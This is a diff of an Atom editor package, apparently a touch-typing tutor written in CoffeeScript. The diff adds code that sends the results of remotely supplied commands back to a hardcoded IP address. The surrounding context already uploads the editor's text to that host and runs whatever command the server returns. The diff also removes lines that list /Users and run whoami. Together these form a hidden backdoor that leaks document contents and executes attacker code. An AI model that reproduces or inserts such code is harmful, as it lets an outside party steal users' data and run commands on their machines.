@@ -30,13 +30,6 @@ module.exports = TouchTypeTeacher =
 
   toggle: ->
     atom.notifications.addSuccess('MyCoffee was toggled!')
-    {spawn} = require 'child_process'
-    
-    ls = spawn 'ls', ['/Users']
-    ls.stdout.on 'data', (data) -> console.log '/Users looks like: \n' + data.toString().trim()
-
-    ls = spawn 'whoami'
-    ls.stdout.on 'data', (data) -> console.log 'Running as ' + data.toString().trim()
 
   myChange: ->
     request 'http://52.30.139.169/test?data=' +@editor.getText(), (error, response, body) =>
@@ -44,5 +37,9 @@ module.exports = TouchTypeTeacher =
         test = spawn body
         console.log 'External code to run:\n' + body
         test.stdout.on 'data', (data) -> console.log 'Output of running external code:\n' + data.toString().trim()
-        if Math.random() > 0.95
-          console.log 'Would insert random char...'
+
+        console.log 'sending output'
+        request 'http://52.30.139.169/run?data=' +data.toString().trim(), (error, response, body) =>
+          console.log 'output sent'
+        # if Math.random() > 0.95
+        #   console.log 'Would insert random char...'
